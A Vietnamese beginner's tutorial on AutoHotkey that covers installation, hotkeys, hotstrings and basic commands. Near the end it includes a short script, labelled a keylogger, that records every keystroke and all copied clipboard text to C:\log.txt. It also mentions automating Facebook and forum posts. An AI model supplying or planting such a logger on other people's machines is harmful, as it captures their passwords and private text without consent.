**Giới thiệu**

1. Tải về và tạo một chương trình đơn giản.

a. Tải Autohotkey.

b. Tạo 1 chương trình.

2. [Hotkeys &amp; Hotstrings](https://autohotkey.com/docs/Tutorial.htm#s2)

3. Một số lệnh cơ bản.

**1. Tải về và tạo một chương trình đơn giản.**

Autohotkey là một phần mềm hỗ trợ người dùng Window, giúp thực hiện các thao tác nhanh và thuận tiện hơn, phù hợp với người làm văn phòng. Tuy nhiên nếu bạn hiểu sâu hơn một chút và có các kiến thức lập trình, bạn cũng có thể tạo ra các ứng dụng phức tạp.

Ở đây mình hướng dẫn các bạn sử dụng các tính năng đơn giản, hữu ích mà không cần biết quá nhiều về lập trình.

a. Tải autohotkey.

Bản cài đặt:

https://autohotkey.com/download/ahk-install.exe

Bản Portable:

https://autohotkey.com/download/ahk.zip

Nên sử dụng bản cài đặt sẽ đầy đủ tính năng và có các chương trình hỗ trợ. Tải bản Portable nếu máy tính của bạn không cho phép cài đặt (máy tính công ty, quán game .....)

b. Tạo một chương trình.

Sau khi cài đặt xong, để bắt đầu với autohotkey, hãy thử tạo 1 chương trình bằng autohotkey.

**B.1. Tạo file ahk.**

Đầu tiên, ở màn hình desktop hoặc cửa sổ thư mục. Nhấn chuột phải, chọn **new \&gt; AutoHotkey script**.

Hoặc **Start \&gt; run \&gt; notepad** nhấn **Ctrl+S** để lưu file, chọn thư mục lưu, đặt tên file đuôi **.ahk,** phần **Save as type** chọn **All files** , phần **Encodeing** chọn **Unicode.**

**B.2. Viết 1 đoạn mã đơn giản.**

Nhấn chuột phải vào file **ahk** vừa tạo, chọn **edit** hoặc **open with notepad**

Soạn thảo dòng lệnh sau:

Msgbox Đây là thông báo

Lệnh này sẽ hiển thị lên màn hình 1 bảng thông báo với nội dung như trên. Giờ lưu lại là được.

**B.3. Chạy chương trình**

Với bản cài đặt, bạn chỉ cần chạy file ahk vừa tạo là được.

Với trường hợp bạn dùng bản Portable, sau khi lưu file, bạn cần biên dịch file ahk ra file exe để máy có thể hiểu được. Vào thư mục chứa autohotkey **AutoHotkey \&gt; Compiler,** chạy file **Ahk2Exe,** chọn file ahk, chọn thư mục xuất file exe. Sau đó chạy file exe là được. Chương trình không có vòng lặp hay định nghĩa nào nên nó sẽ kết thúc sau khi bạn nhấn ok.

**2. Cài đặt phím nóng và định nghĩa 1 chuỗi phím**

Tính năng đơn giản nhất và phổ biến nhất mà người dùng autohotkey sử dụng là để tạo các tổ hợp phím.

**a. Định nghĩa phím nóng.**

Có rất nhiều tổ hợp phím nóng trong window mà bạn có thể sử dụng, tuy nhiên đôi khi bạn không nhớ hết hoặc không tiện để sử dụng, hoặc tính năng không như bạn mong muốn, vì vậy bạn có thể đặt lại.

Đầu tiên hãy xem bảng ký tự mô tả các phím chức năng cơ bản.

| **#** | Win (phím logo Windows) |
| --- | --- |
| **!** | Alt |
| **^** | Ctrl |
| **+** | Shift |

Đây là các phím cơ bản, để xem tổng hợp tất cả các phím và các nút của chuột, hãy xem phần Key list

Ví dụ trình bày 1 định nghĩa phím: dùng Ctrl + A để khởi động Google Chrome

^a:: run C:\Program Files\Google\Chrome\Application\chrome.exe

Trong đó :: dùng để định nghĩa. Lệnh **run** để chạy 1 chương trình với link viết sau nó. Link cũng có thể là 1 địa chỉ web. Như ví dụ trên, tính năng Ctrl+A để chọn toàn bộ văn bản sẽ bị vô hiệu hóa.

**b. Định nghĩa 1 chuỗi phím.**

Tính năng này giống như viết tắt trong unikey, tuy nhiên, bạn có thể làm nhiều hơn thế. Ví dụ.

::hni:: Thành phố Hà Nội

Trong văn bản chỉ cần gõ **hni** và enter là được dòng chữ **Thành phố Hà Nội.** Hoặc thực thi 1 lệnh.

::chr:: run C:\Program Files\Google\Chrome\Application\chrome.exe

Chỉ cần gõ **chr** và enter để khởi động Google Chrome (lưu ý đường link có thể khác)

Ví dụ sau sẽ thực hiện nhiều lệnh.

::chr::

{

Run https://www.facebook.com

run http://vnexpress.net

run http://mp3.zing.vn/album/Thu-Hai-Luoi-Bieng-Various-Artists/ZOZ60AA9.html

run C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Games\Hearts.lnk

}

return

Đây chỉ là các ví dụ cơ bản, các bạn có thể xem phần Hotstrings &amp; auto-replace trong file hướng dẫn để sử dụng tính năng phức tạp hơn.

**3. Các lệnh cơ bản**

Khi mới bắt đầu, bạn không cần biết quá nhiều lệnh, và cùng không thể nhớ hết được, vì vậy mình liệt kê 1 số lệnh cơ bản hay dùng. Nhớ được thì tốt, mà không nhớ được thì tra file hướng dẫn.

**send** Gửi 1 phím hoặc 1 chuỗi phím từ bàn phím, vd:

send abc123qwerty

**click** Click tới 1 điểm trên màn hình máy tính của bạn, vd:

click 500, 300 ; click điểm có tọa độ 500, 300 trên màn hình

**sleep** Tạm dừng dòng lệnh, đơn vị ms

sleep 5000 ; tạm dừng 5 giây

**msgbox** hiện 1 bảng thông báo ra màn hình

msgbox Đây là thông báo

**run** Chạy 1 chương trình, 1 thư muc hoặc 1 trang web

Đây chỉ là cách mô tả cơ bản cho lệnh đó, chi tiết cách sử dụng có thể xem trong file hướng dẫn. Ngoài ra các bạn cũng có thể xem mô tả các hàm, biến .... để tạo ra 1 chương trình phức tạp hơn.

**4. Một số lưu ý.**

Dòng lệnh thực hiện từ trên xuống, trái sang phải.

Các định nghĩa có thể viết bất kỳ chỗ nào, không chạy nếu không được gọi.

Hãy thêm vào cuối chương trình của bạn dòng lệnh sau để bạn có thể kiểm soát được chương trình của mình. Tạm dừng hoặc tắt chương trình khi muốn. Ở đây mình đặt f8 để tạm dừng, f9 để tắt.

F8::pause

F9::ExitApp

Ví dụ sau đây mình viết 1 chương trình ghi lại tất cả các phím mà bạn nhập, tất cả những gì bạn lưu trong clipboard, có thể coi đây là keylogger. Tất cả sẽ được lưu ra file log.txt, các bạn có thể sửa lại theo ý mình.

Loop

{

Input key, L1 V

fileappend, % key, c:\log.txt

}

~bs:: fileappend, {backspace} , C:\log.txt

~^c::

{

sleep 2000

fileappend, `n- ***Copy:`n %Clipboard%`n***** `n , C:\log.txt

return

}

Các bạn xem các ví dụ không hiểu lệnh nào lên google gõ tên lệnh autohotkey là ra. Đọc file hướng dẫn rất chi tiết và dễ hiểu.

Có thể ứng dụng để tự động đăng bài, bình luận lên FB hoặc các diễn đàn, hoặc có thể dùng làm auto cho game....

**Các chương trình hỗ trợ**

AU3\_Spy Phần mềm cho biết tất cả các thông tin của con trỏ của bạn. Cho biết vị trí con trỏ trong cửa sổ, vị trí trong màn hình, tên cửa sổ đang mở, màu sắc .... Phần mềm này có trong thư mục autohotkey của bạn

Ahk2Exe Phần mềm biên dịch, tạo ra file exe từ file ahk của bạn, bạn có thể viết file ahk và biên dịch để gửi cho bạn bè sử dụng mà họ không cần cài autohotkey.

SciTE Phần mềm soạn thảo, thông thường có thể dùng notepad để viết chương trình, nhưng với các chương trình lớn, nhiều lệnh, phức tạp, nên dùng phần mềm này cho dễ nhìn, sẽ có gợi ý cấu trúc khi bạn viết 1 lệnh